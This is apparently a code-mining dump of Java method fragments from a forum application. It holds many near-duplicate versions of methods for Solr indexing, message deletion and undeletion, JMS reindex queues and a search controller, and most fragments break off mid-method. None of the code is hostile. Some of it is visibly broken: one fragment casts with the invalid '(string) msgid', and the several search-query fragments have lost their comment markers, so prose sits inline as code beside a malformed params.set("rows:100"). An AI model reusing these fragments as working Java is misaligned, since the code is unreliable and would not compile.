public static void delete ( SolrServer server , int msgid ) { try { server.deleteById((string) msgid); } catch (Exception ex) { logger.error("[SolR]: the index cannot be cleaned :"+ex.toString()); } } } 
public static void delete ( SolrServer server , int msgid ) { try { server . deleteById ( ( Integer . toString ( msgid ) ) ) ; 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpServletRequest request ) throws Exception { HttpSession session = request . getSession ( ) ; if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; SolrServer search = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView undelete ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; SolrServer search = null ; try { db = LorDataSource . getConnection ( ) ; 
public String deleteReplys ( int msgid , User user , boolean score ) throws SQLException , ScriptErrorException , IOException , SolrServerException { return deleteReplys ( msgid , user , score , 0 ) ; } 
public static void delete ( SolrServer server , int msgid ) throws IOException , SolrServerException { server . deleteById ( ( Integer . toString ( msgid ) ) ) ; server . commit ( ) ; } 
public static void delete ( SolrServer server , List < String > msgids ) throws IOException , SolrServerException { server . deleteById ( msgids ) ; server . commit ( ) ; } 
public static void undeleteComments ( SolrServer server , int topicid , ResultSet comments ) throws IOException , SolrServerException , SQLException { Collection < SolrInputDocument > docs = new ArrayList < SolrInputDocument > ( ) ; UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; while ( comments . next ( ) ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comments . getString ( " section_id " ) ) ; doc . addField ( " section_id " , comments . getString ( " section_id " ) ) ; doc . addField ( " user_id " , comments . getInt ( " user_id " ) ) ; doc . addField ( " topic_id " , topicid ) ; doc . addField ( " title " , comments . getString ( " title " ) ) ; doc . addField ( " message " , comments . getString ( " message " ) ) ; doc . addField ( " postdate " , comments . getTimestamp ( " postdate " ) ) ; doc . addField ( " is_comment " , true ) ; docs . add ( doc ) ; } updateRequest . add ( docs ) ; updateRequest . process ( server ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMessage msgUpdate ) throws SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; Connection db = LorDataSource . getConnection ( ) ; try { Message msg = new Message ( db , msgUpdate . getMsgid ( ) ) ; 
public void updateMessageOnly ( final int msgid ) { jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) throws JMSException { return session . createObjectMessage ( new UpdateMessage ( msgid ) ) ; } 
public static void undeleteComments ( SolrServer server , int topicid , ResultSet comments ) throws IOException , SolrServerException , SQLException { Collection < SolrInputDocument > docs = new ArrayList < SolrInputDocument > ( ) ; UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; while ( comments . next ( ) ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comments . getInt ( " id " ) ) ; doc . addField ( " section_id " , comments . getString ( " section_id " ) ) ; doc . addField ( " user_id " , comments . getInt ( " user_id " ) ) ; doc . addField ( " topic_id " , topicid ) ; doc . addField ( " title " , comments . getString ( " title " ) ) ; doc . addField ( " message " , comments . getString ( " message " ) ) ; doc . addField ( " postdate " , comments . getTimestamp ( " postdate " ) ) ; doc . addField ( " is_comment " , true ) ; docs . add ( doc ) ; } updateRequest . add ( docs ) ; updateRequest . process ( server ) ; } 
public String apply ( @Nullable Comment comment ) { return Integer . toString ( comment . getId ( ) ) ; } 
public void handleMessage ( SearchQueueSender . UpdateComment msgUpdate ) throws SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; Connection db = LorDataSource . getConnection ( ) ; PreparedStatement pst = null ; try { Comment comment = new Comment ( db , msgUpdate . getMsgid ( ) ) ; 
private void updateMessage ( Message topic ) throws IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; updateRequest . add ( doc ) ; updateRequest . process ( solrServer ) ; } 
private void updateComment ( Comment comment , Message topic , int msgid , String message ) throws IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " title " , topic . getTitle ( ) ) ; } else { doc . addField ( " title " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; updateRequest . add ( doc ) ; updateRequest . process ( solrServer ) ; } 
private void delete ( List < String > msgids ) throws IOException , SolrServerException { solrServer . deleteById ( msgids ) ; solrServer . commit ( ) ; } 
public void updateMessageOnly ( int msgid ) { updateMessage ( msgid , false ) ; } 
public void updateMessage ( final int msgid , final boolean withComments ) { jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) throws JMSException { return session . createObjectMessage ( new UpdateMessage ( msgid , withComments ) ) ; } 
public void updateComment ( final int msgid ) { jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) throws JMSException { return session . createObjectMessage ( new UpdateComment ( msgid ) ) ; } 
public boolean isWithComments ( ) { return withComments ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) throws SQLException , ScriptErrorException { return deleteReplys ( msgid , user , score , 0 ) ; } 
public void deleteComment ( int msgid , String reason , User user , int scoreBonus ) throws SQLException , ScriptErrorException { doDeleteComment ( msgid , reason , user , scoreBonus ) ; searchQueueSender . updateComment ( msgid ) ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) throws SQLException , ScriptErrorException { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; searchQueueSender . updateComment ( deleted ) ; return deleted ; } 
public void handleMessage ( SearchQueueSender . UpdateComments msgUpdate ) throws SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgids ( ) ) ; Connection db = LorDataSource . getConnection ( ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT message FROM msgbase WHERE id=? " ) ; 
private void delete ( int msgid ) throws IOException , SolrServerException { solrServer . deleteById ( ( Integer . toString ( msgid ) ) ) ; solrServer . commit ( ) ; } 
public Message createMessage ( Session session ) throws JMSException { return session . createObjectMessage ( new UpdateComments ( Collections . singletonList ( msgid ) ) ) ; } 
public void updateComment ( final List < Integer > msgids ) { jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) throws JMSException { return session . createObjectMessage ( new UpdateComments ( msgids ) ) ; } 
public List < SearchItem > show ( SolrServer search , Connection db ) throws SQLException , UserErrorException , SolrServerException { ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort","postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr QueryResponse response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; List < SearchItem > res = null ; long time ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = sv . show ( solrServer , db ) ; time = System . currentTimeMillis ( ) - current ; } finally { if ( db ! = null ) { db . close ( ) ; } } params . put ( " result " , res ) ; params . put ( " time " , time ) ; } return new ModelAndView ( " search " , params ) ; } 
public void updateMessage ( final int msgid , final boolean withComments ) { logger . debug ( " Scheduling reindex # " + msgid + " withComments= " + withComments ) ; jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public ModelAndView reindexAll ( ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; try { tmpl . initCurrentUser ( db ) ; 
public ModelAndView reindexAll ( ) { return new ModelAndView ( " search-reindex " ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMessage msgUpdate ) throws SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; Connection db = LorDataSource . getConnection ( ) ; try { reindexMessage ( db , msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) throws IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { delete ( msg . getId ( ) ) ; } if ( withComments ) { CommentList commentList = CommentList . getCommentList ( db , msg , false ) ; 
public String apply ( @Nullable Comment comment ) { return Integer . toString ( comment . getId ( ) ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMonth msgUpdate ) throws SQLException , MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; Connection db = LorDataSource . getConnection ( ) ; try { long startTime = System . nanoTime ( ) ; 
public void updateMessage ( final int msgid , final boolean withComments ) { logger . info ( " Scheduling reindex # " + msgid + " withComments= " + withComments ) ; jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public void updateMonth ( final int year , final int month ) { logger . info ( " Scheduling reindex by date " + year + '/' + month ) ; jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) throws JMSException { return session . createObjectMessage ( new UpdateMonth ( year , month ) ) ; } 
private SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " title " , topic . getTitle ( ) ) ; } else { doc . addField ( " title " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
private void updateComment ( Comment comment , Message topic , String message ) throws IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; updateRequest . add ( processComment ( topic , comment , message ) ) ; updateRequest . process ( solrServer ) ; } 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) throws IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { solrServer . deleteById ( ( Integer . toString ( msg . getId ( ) ) ) ) ; } if ( withComments ) { CommentList commentList = CommentList . getCommentList ( db , msg , false ) ; 
private void updateMessage ( Message topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " title " , topic . getTitle ( ) ) ; } else { doc . addField ( " title " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
private void updateComment ( Comment comment , Message topic , String message ) throws IOException , SolrServerException { solrServer . add ( processComment ( topic , comment , message ) ) ; } 
public void optimize ( ) throws IOException , SolrServerException { logger . info ( " Optimizing solr index " ) ; solrServer . optimize ( ) ; logger . info ( " Finished solr index optimization " ) ; } 
private void updateMessage ( Message topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; List < SearchItem > res = null ; long time ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = sv . show ( solrServer , db ) ; time = System . currentTimeMillis ( ) - current ; } finally { if ( db ! = null ) { db . close ( ) ; } } params . put ( " result " , res ) ; params . put ( " time " , time ) ; } return new ModelAndView ( " search " , params ) ; } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; List < SearchItem > res = null ; long time ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = sv . show ( solrServer , db ) ; time = System . currentTimeMillis ( ) - current ; } finally { if ( db ! = null ) { db . close ( ) ; } } params . put ( " result " , res ) ; params . put ( " time " , time ) ; } return new ModelAndView ( " search " , params ) ; } 
public List < SearchItem > show ( SolrServer search , Connection db ) throws SQLException , UserErrorException , SolrServerException { ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","topic_user_id:"+user.getId()); } else { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort","postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr QueryResponse response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
private void updateMessage ( Message topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " title " , topic . getTitle ( ) ) ; } else { doc . addField ( " title " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
public String apply ( Comment comment ) { return Integer . toString ( comment . getId ( ) ) ; } 
public HttpClient getObject ( ) throws Exception { return httpClient ; } 
public void afterPropertiesSet ( ) throws Exception { httpClient = new HttpClient ( connectionManager ) ; Credentials credentials = new UsernamePasswordCredentials ( username , password ) ; httpClient . getState ( ) . setCredentials ( new AuthScope ( host , port ) , credentials ) ; httpClient . getParams ( ) . setAuthenticationPreemptive ( true ) ; } 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; try { tmpl . initCurrentUser ( db ) ; 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) throws IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger . info ( " Deleting message " + msgid + " from solr " ) ; solrServer . deleteById ( ( Integer . toString ( msg . getId ( ) ) ) ) ; } if ( withComments ) { CommentList commentList = CommentList . getCommentList ( db , msg , false ) ; 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) throws IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger . info ( " Deleting message " + msgid + " from solr " ) ; solrServer . deleteById ( ( Integer . toString ( msg . getId ( ) ) ) ) ; } if ( withComments ) { CommentList commentList = CommentList . getCommentList ( db , msg , true ) ; 
public void deleteComment ( int msgid , String reason , User user , int scoreBonus ) throws SQLException , ScriptErrorException { doDeleteComment ( msgid , reason , user , scoreBonus ) ; } 
public QueryResponse performSearch ( SolrServer search , Connection db ) throws SQLException , UserErrorException , SolrServerException { ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","topic_user_id:"+user.getId()); } else { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort","postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client return search.query(params); } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; ArrayList < SearchItem > res = new ArrayList < SearchItem > ( 100 ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long time = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " time " , time ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new ModelAndView ( " search " , params ) ; } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; ArrayList < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long time = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " time " , time ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new ModelAndView ( " search " , params ) ; } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long time = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . 